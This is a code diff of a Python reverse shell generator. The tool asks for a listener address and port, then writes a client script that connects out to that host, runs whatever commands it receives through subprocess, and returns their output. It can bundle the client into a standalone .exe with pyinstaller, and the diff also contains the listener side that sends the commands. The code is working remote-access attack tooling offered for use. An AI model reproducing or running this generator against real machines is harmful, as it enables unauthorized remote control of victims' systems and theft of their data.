@@ -1,29 +1,25 @@
 import socket 
-import sys
 import subprocess
 import os
-import time
 import shutil
+import sys
 
+global genClientCount
+genClientCount = 1
 
 def revshmain(callback):
-    print("welcome to reverse shell generator\n")
-    print(".\n")
-    print("1. Generate tcp client\n")
-    print("2. Connect to client\n")
+    print("welcome to reverse shell generator")
+    print("\n1. Generate tcp client")
+    print("\n2. Connect to client")
     choice = input("Select: ")
 
     if choice == "1":
         genClient()
     elif choice == "2":
         connectClient()
-    
-    pass
 
-def genClient():
-    pass
 
-def connectClient():
+def connectClient(): # need to fix
     socket_create()
     socket_bind()
     socket_accept()
@@ -77,32 +73,15 @@ def send_commands(conn):
             print(client_resp, end="")
 
 
-#portc and addressc for gen client
-# def genClient():
-
-#     addressc = input("\nEnter your listener address: ")
-#     portc = input("\nEnter your listener port: ") #maybe add a port scanner here
-#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#     s.connect((addressc,portc))
-#     Flag = True
-#     while Flag:
-#         command = s.recv(4092).decode("UTF-8")
-#         if command == 'exit':
-#             s.close()
-#             break
-
-#         else:
-#             CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-#             s.send(CMD.stdout)
-
 def genClient():
+    global genClientCount
 
     addressc = input("\nEnter your listener address: ")
     while True:
-        port_input = input("\nEnter your listener port: ")
+        portInput = input("\nEnter your listener port: ")
         try:
-            portc = int(port_input)
-            break  # Exit loop if conversion to int succeeds
+            portc = int(portInput)
+            break  
         except ValueError:
             print("Please enter a valid integer for the port.")
 
@@ -120,52 +99,54 @@ import subprocess
 
 def genClient():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect(("{addressc}", {portc}))
-        print(f"Connected to {addressc}:{portc}")
-        
-        while True:
-            command = s.recv(4092).decode("UTF-8")
-            if command == 'exit':
-                break
+    s.connect(("{addressc}", {portc}))
+    
+    while True:
+        command = s.recv(4092).decode("UTF-8")
+        if command == 'exit':
+            break
 
-            elif command.strip(): 
-                CMD = subprocess.run(command, shell={shellBool}, capture_output=True)
-                output = CMD.stdout + CMD.stderr
-                s.send(output)
+        elif command.strip(): 
+            CMD = subprocess.run(command, shell={shellBool}, capture_output=True)
+            output = CMD.stdout + CMD.stderr
+            s.send(output)
 
-    except socket.error as e:
-        print("socket error as: " + e)
-    finally:
-        s.close()
+    s.close()
 
 genClient()
 """
 
     pyorexe = input("\nGenerate an executable .py file[1] or .exe file[2]: ")
-
+    fileName = f'tcpClient_{genClientCount}_.py'
     if pyorexe == "1":
-        with open('tcpClient.py', 'w') as file:
+        with open(fileName, 'w') as file:
             file.write(genClient_code)
-        subprocess.run(['chmod', '+x', 'genClient.py'])
+        subprocess.run(['chmod', '+x', fileName])
 
     elif pyorexe == "2":
-        with open('tcpClient.py', 'w') as file:
+        with open(fileName, 'w') as file:
             file.write(genClient_code)
-        result = subprocess.run(['pyinstaller', '--onefile', '--clean', 'tcpClient.py'])
+        result = subprocess.run(['pyinstaller', '--onefile', '--clean', fileName])
 
         if result.returncode == 0:
             # Move the generated executable and clean up
-            if os.path.exists('dist/tcpClient.exe'):
-                shutil.move('dist/tcpClient.exe', './tcpClient.exe')
+            if os.path.exists(f'dist/{os.path.splitext(fileName)[0]}.exe'):
+                shutil.move(f'dist/{os.path.splitext(fileName)[0]}.exe', f'./{os.path.splitext(fileName)[0]}.exe')
                 shutil.rmtree('dist')
                 shutil.rmtree('build')
-                os.remove('tcpClient.spec')
-                os.remove('tcpClient.py')
+                os.remove(os.path.splitext(fileName)[0] + '.spec')
+                os.remove(fileName)
                 print("Executable file successfully created.")
+                return
             else:
                 print("Error: Failed to find generated executable.")
-                print(result.stderr)
+                return
         else:
             print("Failed to create executable file. Error output:")
             print(result.stderr)
+            return
+
+if __name__ == "__main__":
+    global client_counter
+    client_counter = 1 
+    revshmain(None)
